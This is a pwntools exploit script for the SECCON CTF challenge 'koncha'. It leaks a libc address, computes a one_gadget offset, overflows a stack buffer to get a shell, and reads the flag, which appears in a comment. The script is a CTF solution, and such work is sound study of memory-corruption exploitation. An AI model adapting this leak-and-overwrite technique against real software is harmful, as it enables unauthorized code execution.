#!/usr/bin/env python3
from pwn import *


def connect():
    if args.LOCAL:
        return gdb.debug([context.binary.path], api=True)
    else:
        return remote("koncha.seccon.games", 9001)


def try_pwn(tube):
    if args.LOCAL:
        tube.gdb.continue_nowait()
    tube.sendafter(b"Hello! What is your name?\n", b"\n")
    tube.recvuntil(b"Nice to meet you, ")
    (leak,) = struct.unpack("<Q", tube.recvn(6) + b"\x00\x00")
    print("leak=" + hex(leak))
    libc = leak - 0x1F12E8
    print("libc=" + hex(libc))
    if libc & 0xFFF != 0:
        return None
    one = libc + 0xE3B01
    print("one=" + hex(one))
    tube.sendlineafter(
        b"Which country do you live in?\n",
        flat(
            {
                0x58: struct.pack("<Q", one),
                0x60: b"\0" * 1024,
            }
        ),
    )
    token = flat({}, length=64)
    tube.sendline(b"echo " + token)
    tube.recvuntil(token + "\n")
    tube.sendline(b"cat flag-*.txt")
    return tube.recvline().strip().decode()


def main():
    context.binary = "koncha/bin/chall"
    while True:
        with connect() as tube:
            flag = try_pwn(tube)
            if flag is not None:
                # SECCON{I_should_have_checked_the_return_value_of_scanf}
                print(flag)
                break


if __name__ == "__main__":
    main()
